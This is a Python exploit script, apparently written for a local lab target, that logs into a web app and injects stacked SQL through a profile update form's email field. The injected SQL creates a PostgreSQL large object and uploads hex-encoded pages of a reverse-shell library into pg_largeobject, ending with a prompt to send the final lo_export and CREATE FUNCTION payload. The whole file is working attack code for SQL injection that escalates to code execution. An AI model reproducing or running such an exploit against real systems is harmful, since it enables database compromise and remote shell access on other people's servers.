#!/usr/bin/env python3
from pathlib import Path

import requests


BASE_URL = "http://localhost:5000"
USERNAME = "lan_store"
PASSWORD = "seller123"
PROFILE_ID = 3
LOID = 55001
POSTGRES_DIR = Path(__file__).resolve().parent
PAGES_DIR = POSTGRES_DIR / "artifacts" / "pg_rev_shell_pages"
END_SQL = "SELECT title, body, created_at FROM posts WHERE '1'='1"


def trigger(session: requests.Session, payload: str, description: str) -> str:
    session.post(
        f"{BASE_URL}/profile/update",
        data={"email": payload, "description": description},
        allow_redirects=False,
        timeout=30,
    )
    response = session.get(f"{BASE_URL}/profile?id={PROFILE_ID}", timeout=30)
    body = response.text.lower()

    for error in ("syntax error", "duplicate key value", "permission denied"):
        if error in body:
            raise RuntimeError(f"{error} while processing {description}")

    response.raise_for_status()
    return response.text


pages = sorted(PAGES_DIR.glob("page-*.hex"))
if not pages:
    raise SystemExit(f"No page-*.hex files found in {PAGES_DIR}")

session = requests.Session()
print(f"[*] Logging in as {USERNAME}")
session.post(
    f"{BASE_URL}/login",
    data={"username": USERNAME, "password": PASSWORD},
    allow_redirects=False,
    timeout=30,
).raise_for_status()

print(f"[*] Creating fresh Large Object {LOID}")
init = (
    "x'; "
    "DROP FUNCTION IF EXISTS rev_shell(text, integer); "
    f"SELECT CASE WHEN EXISTS (SELECT 1 FROM pg_largeobject_metadata "
    f"WHERE oid = {LOID}::oid) THEN lo_unlink({LOID}) ELSE 0 END; "
    f"SELECT lo_create({LOID}); "
    f"{END_SQL}"
)
trigger(session, init, "create Large Object")

for page_file in pages:
    pageno = int(page_file.stem.split("-")[1])
    hex_page = page_file.read_text(encoding="ascii").strip()
    payload = (
        "x'; "
        f"INSERT INTO pg_largeobject (loid, pageno, data) "
        f"VALUES ({LOID}, {pageno}, decode('{hex_page}', 'hex')); "
        f"{END_SQL}"
    )
    print(f"[*] Uploading {page_file.name} -> pageno {pageno}")
    trigger(session, payload, f"page {pageno}")

print(f"[+] Uploaded {len(pages)} pages into LOID {LOID}")
print("[*] Send the final lo_export + CREATE FUNCTION + rev_shell payload.")
